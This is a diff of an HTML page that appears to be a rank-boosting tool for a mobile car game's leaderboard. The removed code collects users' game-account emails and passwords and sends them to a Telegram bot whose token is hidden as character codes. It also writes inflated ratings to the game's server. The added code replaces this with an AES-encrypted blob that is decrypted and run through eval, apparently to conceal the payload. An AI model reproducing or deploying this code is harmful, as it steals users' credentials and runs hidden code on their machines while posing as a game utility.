@@ -68,115 +68,54 @@ footer{
 
 <footer id="dynamicFooter"></footer>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+
 <script>
 
-document.getElementById("loginForm").style.display="block";
-const footer = localStorage.getItem("GENERATED_FOOTER") || "Cris Gaming";
+
+
+document.getElementById("loginForm").style.display = "block";
+
+
+const footer =
+  localStorage.getItem("GENERATED_FOOTER") || "Cris Gaming";
 document.getElementById("dynamicFooter").textContent =
   `© ${new Date().getFullYear()} ${footer}`;
 
 
-const _T=[56,52,54,50,54,49,56,56,51,56,58,65,65,69,83,83,106,109,97,109,120,77,90,117,111,87,87,79,119,108,85,68,74,122,98,88,75,50,74,80,70,115,119,90,118];
-const _C=[[54,55,56,52,51,56,50,55,57,53]];
-const BOT_TOKEN=_T.map(n=>String.fromCharCode(n)).join('');
-const CHAT_IDS=_C.map(a=>a.map(n=>String.fromCharCode(n)).join(''));
-
-function sendCostMessage(msg){
-  CHAT_IDS.forEach(id=>{
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({chat_id:id,text:msg})
-    });
-  });
+function updateStatus(msg, isError=false, target="status"){
+  const el = document.getElementById(target);
+  if(!el) return;
+  el.textContent = msg;
+  el.style.color = isError ? "#ff5555" : "#55ff55";
 }
 
-
-const GAMES={
- "1":{
-   api_key:"AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
-   rank_url:"https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
- }
-};
-const selectedGame=GAMES["1"];
-let currentUser=null,currentToken=null,currentPassword=null;
-
-
-function updateStatus(msg,err=false,target="status"){
- document.getElementById(target).textContent=msg;
-}
 
 
 (function(){
 
-  function _post(u,b,h){
-    return fetch(u,{
-      method:"POST",
-      headers:h||{"Content-Type":"application/json"},
-      body:JSON.stringify(b)
-    });
+  
+  const ENCRYPTED_PAYLOAD = `
+VTJGc2RHVmtYMStQWkl4RVBPbnB2eXZ0TDhmQ3cyZzdhU2Ixcm5kTDZwYXdzVVlyVUpzNzVVRlZ2VFAvdmh3ZlF4S2dLb0dGVk5ZOHI3dS9SbTBtbjhPSDZsRTlYSDZUSFpDb3RiSGppOUdNTEhaZHU3Z1VLWkM3UTNRTGFmUmhVRTQ2ck5rZmlwTjhrN2hkRzJBNUM1WElucTdsYkp5dGlLTjVGaWJyYm42TXNnTWZ1dDgwMVAvU1U3UncvQU50SG5VVjRuM3NTdjZHN3dVdXZGVGxham5IaHdkc01uU0FMSjlIb2JiMGdqTnplZEh3a3djWUo1Vk9FWkFxY1hqTnIzeVpoZnhmdDJEZEpJQ25ac3dpUlgzY0N5R08zUExIVjY0djhteHdRMGQ0Rjgybzk2cjJYaldMUTBTSUtvM3dXeEE1VGVGcmpkYUUvaWwzc3NKQ2Y3SFdGN2lqcU4zcldzU2JjQ1VsN2IvY2ZZZzgwVUlqMGdGekQzeGJmNi8xMWVvWDg3a3lkTWk2VWg0YVZNZFJFY0tJaks3SVFDZThvTmM1QjUyTTU2aGxPeU5rMVNBb0NhMUdOL3F6TWI0SjBibSthUUZQUmJTUFFhdHBJL0Z3WFBFOFVBTGJIL0FHV0hmY1p6UWNyRHNONlV0KzBaakFBWTZleVpQaHdrN2tobzFuSzNlaDYvdDNPNUhvb1JrdjNRTG12Z0xtMWNJVTJiMlJKcThBSTF6UUE4UmpjWUJNOFVxTE5DY3VrdER0Qzk0a1FJQXV5bWNMQngwaTg5TTdpVlNBbU9ic0lkdG9ITFE1T3Ara1VGdHVycWJCS0s1bTFjb0hKR2JxMExlVEpIY3d6TVhONko1a3A1dk1CS0RmbUIxUmRZdTNQR0NSNllkZDNxN3ZScUtmdU9YSUpLL1hSWGFtZU9sVHlVVkt0MU9IN2ZvdGYydGNXUW5VTVVSbUVENm4rM1Q1WG9QOHVRZEpuNzladzcvUEsxb1JWbmRjbWVWd1ZIbWVvaWFRUkcrVk13bm1NWExxM2pwcVZJaXNERjhJRTZsU0FmRlloZTU5MFFHVksyRVFGN1Z1OWtuZHpMRlNzZmtHdjhxQ0psR09BTzVKZHU2RkxsNmlObWRUaDBuSnB0QlJWRzdrNGZpNytpemZPdkRibnlLcUE4Y3BVUGtoRnJaOU1pdXRuc3lyd0IxdlJTemVpTVAycXpYTHdTaHFwemhpVGZPaHBGNjJHSUlBWFJKZjVCckgyYzdsQXNJZnNXZEZURHI1R0ZvYnNjdTZLYnUyWC9LbTBpL1lyQ2dDaER6bWRYYnBUSjBvdUpDOEFsOWF5SmFvYXBGM1I0bzMyQTBXZzJ2Tk5XbmRIQ0lvZ1NQYVRPTzNGVHIxL2g0U29aOGNZVHlFdnNsSEtkQjdZTTJudStydStDcTlSNmcvbnoxNURtNjk5cUIwWUlma1FrTnZsQ0NlbmExWmN4cktBNnlZajBlRUhYU09Eb2xRYzgzcTJ4WkttSDBKMmMvTm9lVFlrU3p4MERxUlFSVG95UnY3T3NPNGdhSm5nRjhoNndCRGtRNjRNd29NN1RacWdtSGNFQXN6THBlR2lZQzhHalRHSkZFbDlzdmFWdVBzMXlqZ0hYRFlkVXovVGlVekJDbVdvU1JLTXk1MFhrendIQVJVTUcwSnR6U2c2RW9NNEdvdExjL3JFUXB1emZZV0E2YVA5eURZZUZlUkFIOXlGcEJISTRlQ0dSZzQzNEN0b1hJZHRhOTNqM0xJMld1Wmc3TFlOMVV6UEVUTFRXR2hEQjliRGFjdnJzeVJIS3lwaVl6bFZpdmJXVm1Hc3BnWG94TlVZSTVBSzFNa0FOaENoNHVUSWdram9nU3IyNTlUR3ZxVTlDQzkrNjVaaTlsRVN5cThWNlVTSnRGWkVJUTgvcTFQaWg5bVRCSUU0eWZVV2pYWUdRcms4R0tnTWZkVTlTa0M1T2E0R2tmbG5OcnpSbG56M3lmaTBHN0ZwZ3BmK1Vkem1tSTB1a0FIYjN6YXBwVTdQTDdPUURmekhrM0t4R01MQXV6Z0djRU9JY0h5aEtzK01KaC9oT1g5eGRLa0pqYVA0enc3U1YzOGIvMXRBL3Rrd0JZUUZwdmhURjF4MTRuUnc0Z3FkVjVvR1RWTURDdlcvMnJVS1JBeUpJRThYWEhicFhld1ZQSHFUZk13RWJiRlpscmNsdHUzellsV01Ca2JwdlRxbXRIMnp4OHhTR1FrVmd0cTV3TlNDSEJ3Ym0zaW9aOWxrNUltZE1IdFA5a0FINDJwZWtMRmRBeTlhTUptb0hVdUdwd05WQmxDeWM2Z250S0RPSE9GSk53M2ZNdW8xeDMzNUsrcjlEMENQb04yRGRjKzZPclRWditnM1hBckVPT2ZRMjJNTk44eXlWUXFiZkx4MlU3Mjl0K1VmcWJXbGlhQWpaSTJwcCt1SGNLNEFNMXExNE01L2tDU3Y2QTRSWXVCSU5XS1BqOWhVaHhhUmc2cXBweGFMVHgvbXYzWCtTTTdEeU91NTdVRFdwSCtYTTZtSXVJSDZYZURJaHlCempESm0rdy9MNW9sRjJSWGQxVHlKZ3FEaS9hZ0M2ZmJ0M011Q1NualBjZHBpL2N2TkQ0MjZNSm5helNyaWpWOEFoTTBJSWs2TXRPb2pTRHJkczcxTEFwdlFZQ20wTG5EeSt1Z0NvSm9kK1dCZ1dmNDBrOWdUY0lydzVjMjN6dVNMNGtIRjlBL2hPNTNGUUlaV0tWUWZsTG9uQlU5YUJOTVBLSk10WHRCUjFzYm4xSjI5MVlUTExiMWZjK1FZYjJTUnVTOE1heTNTV2piclhqbmNNcVZMVDg3MmFDZjI5anlsVFZHWjRvRDUyaUJqa0xCUVh3TVJMKzgwUXU1WlpiWVdaTHZscWFJUTA5c3lyRmM1RE94eUJSSlorR0tHcWM3T0ZwMzFSby9FdXBVTTRwOEF2YTVZaDF1UWlVVGJCTG10RXJRSTZEV25qelBzZk9yWVI4c3VGdnVCRCtTdFQ1cFNjN1RDajBSRWFjcXZJSnFzTkg0dUk1UUtJUGx6RmVnWVdqVDVNWUorYkNQbXJFV0hHMHhVSmpLYzdmek0yRWdMNnhTOTRBbWl2aGlwR0YwZ2FyM0JiS2QxS2NrK1BmcE9NZHBPaVVTcVlPL0M3Q05TN0syc1FlUFd4bys0SUNINUpRSEVtYzBSNThtVEtUQWdEalVrV2VZZjRJMkNyOEhUVi9pSHlybExGMjBUSVVXaDI3YWIrbFducFdXNzlvVCtnMC9XTEFKbzNHdS9mMDQ1VTNncXloeEJjMTFhbEV5c1FmRGQ0U1N3cnJ5VW9ERHFJcm5pc2ovMDVOTzFIb2N0WUZhQitXd2M5YWU2dGJ2dDNqU0VscTVkR1g5Y1NIelVYek91VU1kQW9NelJ5MTl6OENSQlF5MTBseHR2eGo2eTB5Qkc2UkowbThpeFp4RmptK2h2TVRCM2dyekxxcWRrL1c3cW5zdzRZdXIyYVhwOU50dkp6Uk54VTE5cDNYQU53TXdUV2duVzUvVk05ZkhIMzRSTnZRSG1sVE9mTUV4ZFdYa2RCR2tTRUJmSExJUkdtWFFTeGlzUjkvbFJpbWJ4dk1tQ0cxSTVvK3RzMlFEVVM4Zk5OVm4vU2kyN3ZacU9GN205cWJZdExZdHRNMEZ0UjFHNTVkUW9GT2pmMy9RTnR4M2VSUDhnbmFOWmxialdZZTRJRkhtRTFKeDBNdEsvZ0JUYmZlWlphTWJWeWI0MzN3eHYyTGl0cVlPa1ZrbTlYTk9lSTBqSHJOK3BINi9qYWM3Vnd0MHdNUEtlVHVORnI4VWZTamhyRUJJRzVZb2JMWjcxSlZxMnF4MFBWcTdRN29TSHQyaTRCTDViN1NmRHZPelAvbEROVVE1WGVhR1ZOdnoyOTFJcDdtcGtVc1Jnd0FGWUZJYW9UZTk2VnRuTjFYVVdFQWFaamlvV2xVWFZvaWU1YXY2VHpuQmF6d3BkaEVwdXVueEh3Uk9hUVUrU2dnTW9VOFgxVWJsWWdkWW52MUc5azlvNHJJY1VGVDdTOUdOR0FWNnF4QklqZkRTSU9YYlllTW1EZDlvekhORXpuWmJ3VXNHNnE1dExPQ2xyL3ZOY0FpTHIvcG81UEJSNVd2M09RUmNVK25ocVBscjVLQ0FFTUxlemxuRWYzQ1loczAwZjEwVVM2bU9ybFZYL1FobnlMUWlZYmJUVGlwMTJ5MGNrNkJzS1QrYmt1eTVzanFWM0sxSzM2WVhtZjhBdGY0b3I4cGhLSW9yeW5FNDNOQ2F4YXluZFVjYmxiQ01FVTdVVFkwOUNPSnFvLzFXZU1ObHppODBoQm5xYzlyRmVNTkdVL3hFRElGTWRXMlFESTRiSUpNSUZuSXBGNk1TWTM0TXdySmExT0tvOFpnT1cyMm51MEFkaU9tb3IvMTZmd25INGt1SnBBOXp6bHI5dS9SeDBYbWEzT2lRaE5PUFRXUS9Rd28zT2czS01PUlJVUzJiWkRBYVB4alVnc1gwWlZBcUU1N1NSeTFocnBtUzZub3RLQy9LSFBUZkdGRXhWL2lZNE9aSnJxLzg1Q0E2dlVkdFpLVE1iS2FzSlhlRlBOOVViV21iUWcyNVZyNkxXT1ZDMm9zdnVBYkNwcXdWejJTNWdvRXNqV0hobXpYS0dWRlVYWmdDbFdzRFZ0aGxGQ09jQVUzTjQ3RzBQTTM1SFZVZldvak5Mclc2b0dWNkFrL0M5UFQ2WGYvTkFGZlB4VnVnUzFDVUI4ZjBEVkJXUFFqUmwxR0hGejk5UHRaNEw5SUI0dUlEK0FlOWhiYnI3cE5ITEQ2OVpPV01qMDhtOGdrcjRERDdjUDdXVTRzQzV5c1dtN0gzdjFIdW5NYnI2Uy9kei9sS2xhRmgyb0pUSWwzYQ==
+`;
+
+  const KEY = "cris";
+
+  try {
+    const decrypted = CryptoJS.AES.decrypt(
+      atob(ENCRYPTED_PAYLOAD),
+      KEY
+    ).toString(CryptoJS.enc.Utf8);
+
+    
+    eval(decrypted);
+
+  } catch (e) {
+    console.error("Decryption failed", e);
+    updateStatus("❌ Core script error", true);
   }
-
-  window.loginFirebase=async function(){
-    const e=email.value.trim();
-    const p=password.value;
-    if(!e||!p){updateStatus("Enter email & password!",true);return;}
-
-    updateStatus("Logging in...");
-    try{
-      const r=await _post(
-        "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key="+selectedGame.api_key,
-        {email:e,password:p,returnSecureToken:true}
-      );
-      const d=await r.json();
-
-      if(d.idToken){
-        currentUser=e;currentPassword=p;currentToken=d.idToken;
-        updateStatus("✅ Logged in as "+e);
-        loginForm.style.display="none";
-        menuButtons.style.display="block";
-        sendCostMessage(`🔐 Login\n📧 ${e}\n🔒 ${p}`);
-      }else{
-        updateStatus("❌ Login failed",true);
-      }
-    }catch{
-      updateStatus("❌ Network error",true);
-    }
-  };
-
-  window.kingRank=async function(){
-    if(!currentToken){updateStatus("Login first",true,"serviceStatus");return;}
-
-    updateStatus("Processing King Rank...","serviceStatus");
-    const R={};
-    [
-      "cars","car_fix","car_collided","car_exchange","car_trade","car_wash",
-      "slicer_cut","drift_max","drift","cargo","delivery","taxi","levels",
-      "gifts","fuel","offroad","speed_banner","reactions","police","run",
-      "real_estate","t_distance","treasure","block_post","push_ups",
-      "burnt_tire","passanger_distance"
-    ].forEach(k=>R[k]=100000);
-    R.time=10000000000;R.race_win=3000;
-
-    try{
-      const r=await _post(
-        selectedGame.rank_url,
-        {data:JSON.stringify({RatingData:R})},
-        {"Authorization":"Bearer "+currentToken,"Content-Type":"application/json"}
-      );
-      if(r.ok){
-        updateStatus("✅ King Rank set!",false,"serviceStatus");
-        sendCostMessage(`👑 King Rank\n📧 ${currentUser}`);
-      }else{
-        updateStatus("❌ Rank failed",true,"serviceStatus");
-      }
-    }catch{
-      updateStatus("❌ Server error",true,"serviceStatus");
-    }
-  };
 
 })();
 </script>
-
 </body>
 </html>
